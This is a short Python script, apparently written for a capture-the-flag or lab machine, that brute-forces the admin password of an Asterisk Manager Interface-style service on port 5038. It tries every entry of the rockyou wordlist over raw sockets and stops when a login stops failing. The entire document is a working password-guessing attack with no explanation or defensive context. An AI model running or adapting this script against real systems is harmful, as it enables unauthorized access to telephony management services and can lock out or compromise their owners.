import socket

host = "10.10.165.247"

port = 5038

with open("/usr/share/wordlists/rockyou.txt") as f:
    for line in f:
        passw = line.replace("\n","")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)

        string = "ACTION: LOGIN\nUSERNAME: admin\nSECRET: {}\nEVENTS: ON\n\n".format(passw)

        print(string)

        s.sendall(str.encode(string))

        result = s.recv(1024)

        print(result.decode("utf-8"))
        if(not "failed" in result.decode("utf-8")):
            print(passw + " is the password")
            break

        s.close()